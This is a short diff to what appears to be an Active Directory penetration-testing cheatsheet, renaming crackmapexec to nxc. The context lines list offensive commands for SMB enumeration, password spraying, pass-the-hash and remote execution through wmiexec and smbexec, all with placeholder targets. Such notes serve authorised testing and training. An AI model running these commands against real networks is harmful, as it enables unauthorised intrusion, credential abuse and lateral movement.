@@ -182,8 +182,8 @@ EOF
 Active Directory cheatsheet
   Enum:
     enum4linux -a DC_IP                      # SMB/RPC enum
-    crackmapexec smb DC_IP -u '' -p ''       # Null session
-    crackmapexec smb DC_IP -u user -p pass --shares  # Share enum
+    nxc smb DC_IP -u '' -p ''       # Null session
+    nxc smb DC_IP -u user -p pass --shares  # Share enum
     bloodhound-python -d domain -u user -p pass -ns DC_IP
 
   Attacks:
@@ -194,7 +194,7 @@ Active Directory cheatsheet
     evil-winrm -i IP -u user -H ntlm_hash                # Pass the hash
 
   Lateral movement:
-    crackmapexec smb RANGE -u user -p pass                # Spray
+    nxc smb RANGE -u user -p pass                # Spray
     wmiexec.py domain/user:pass@IP                        # WMI exec
     smbexec.py domain/user:pass@IP                        # SMB exec
     chisel / ligolo-ng                                     # Tunneling
